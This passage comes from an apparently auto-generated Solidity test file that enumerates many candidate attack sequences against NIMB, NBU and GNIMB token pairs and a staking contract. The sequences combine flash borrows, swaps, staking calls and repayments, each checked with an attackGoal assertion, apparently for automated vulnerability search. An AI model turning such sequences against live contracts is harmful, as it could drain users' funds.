        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3242(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3243(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3244(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3245(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3246(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3247(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3248(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3249(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3250(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3251(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3252(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3253(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3254(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3255(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3256(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3257(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3258(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3259(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3260(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3261(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3262(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3263(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3264(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3265(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3266(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3267(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3268(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3269(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3270(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3271(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3272(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3273(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3274(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3275(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3276(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3277(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3278(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3279(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3280(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3281(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_owner_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3282(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
